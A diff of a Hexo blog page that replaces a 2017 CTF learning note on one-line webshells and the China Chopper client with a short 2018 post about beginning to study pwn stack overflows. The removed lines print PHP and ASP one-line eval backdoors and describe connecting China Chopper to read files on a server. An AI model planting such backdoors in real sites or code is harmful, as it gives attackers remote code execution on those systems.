@@ -77,7 +77,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="webshell," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -93,17 +93,17 @@
 
 
 
-<meta name="description" content="看hbctf的一道题学习了一点，先记录下来。首先需要可以上传（写入）文件 写入php文件或asp文件均可。以php为例，新建文件后写下">
-<meta name="keywords" content="webshell">
+<meta name="description" content="作死看了下pwn的栈溢出的最简单的题目">
+<meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一句话木马和中国菜刀">
-<meta property="og:url" content="http://Merl1ng.com/2017/07/18/一句话木马和中国菜刀/index.html">
+<meta property="og:title" content="pwn栈溢出从放弃到放弃">
+<meta property="og:url" content="http://Merl1ng.com/2018/08/17/pwn栈溢出从放弃到放弃/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
-<meta property="og:description" content="看hbctf的一道题学习了一点，先记录下来。首先需要可以上传（写入）文件 写入php文件或asp文件均可。以php为例，新建文件后写下">
-<meta property="og:updated_time" content="2017-08-10T15:43:49.518Z">
+<meta property="og:description" content="作死看了下pwn的栈溢出的最简单的题目">
+<meta property="og:updated_time" content="2018-08-18T07:20:24.911Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="一句话木马和中国菜刀">
-<meta name="twitter:description" content="看hbctf的一道题学习了一点，先记录下来。首先需要可以上传（写入）文件 写入php文件或asp文件均可。以php为例，新建文件后写下">
+<meta name="twitter:title" content="pwn栈溢出从放弃到放弃">
+<meta name="twitter:description" content="作死看了下pwn的栈溢出的最简单的题目">
 
 
 
@@ -131,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://Merl1ng.com/2017/07/18/一句话木马和中国菜刀/"/>
+  <link rel="canonical" href="http://Merl1ng.com/2018/08/17/pwn栈溢出从放弃到放弃/"/>
 
 
 
 
 
-  <title>一句话木马和中国菜刀 | Merl1ng's blog</title>
+  <title>pwn栈溢出从放弃到放弃 | Merl1ng's blog</title>
   
 
 
@@ -266,7 +266,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/07/18/一句话木马和中国菜刀/">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2018/08/17/pwn栈溢出从放弃到放弃/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Merl1ng">
@@ -283,7 +283,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">一句话木马和中国菜刀</h1>
+          <h1 class="post-title" itemprop="name headline">pwn栈溢出从放弃到放弃</h1>
         
 
         <div class="post-meta">
@@ -295,8 +295,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-18T22:11:31+08:00">
-                2017-07-18
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-17T22:33:37+08:00">
+                2018-08-17
               </time>
             
 
@@ -305,28 +305,6 @@
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -352,10 +330,11 @@
       
 
       
-        <p>看hbctf的一道题学习了一点，先记录下来。<br>首先需要可以上传（写入）文件 写入php文件或asp文件均可。<br>以php为例，新建文件后写下<br><a id="more"></a><br><code>&lt;?php @eval($_POST[&#39;QAQ&#39;]);?&gt;</code> (@符号的意思是不报错)<br>顺便asp为<code>&lt;%eval request(&quot;QAQ&quot;)%&gt;</code></p>
-<p>“QAQ”相当于一个标记。eval是一个php函数<br>他将符合php语法的字符当做php代码进行执行<br>即一个后门</p>
-<p>（怎么用hackbar的Post data写入文件还不会…以后回来改）</p>
-<p>连接菜刀 输入网站 和当时标记<br>即可拿shell查看文件（flag）等等</p>
+        <p>作死看了下pwn的栈溢出的最简单的题目</p>
+<a id="more"></a>
+<p>突然想稍微了解下pwn 刚好下学期学什么编译原理之类的应该又要涉及汇编 </p>
+<p>所以看下pwn就当预习了orz</p>
+<p>直接看blog都感觉很吃力 先看下b站上小猪老师的视频</p>
 
       
     </div>
@@ -383,12 +362,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/webshell/" rel="tag"><i class="fa fa-tag"></i> webshell</a>
-          
-        </div>
-      
 
       
       
@@ -398,18 +371,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/07/20/bypass_waf/" rel="next" title="bypass_waf">
-                <i class="fa fa-chevron-left"></i> bypass_waf
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/05/30/lan attack/" rel="prev" title="lan attack">
-                lan attack <i class="fa fa-chevron-right"></i>
+              <a href="/2018/08/16/一点点做题心得/" rel="prev" title="一点点做题心得">
+                一点点做题心得 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
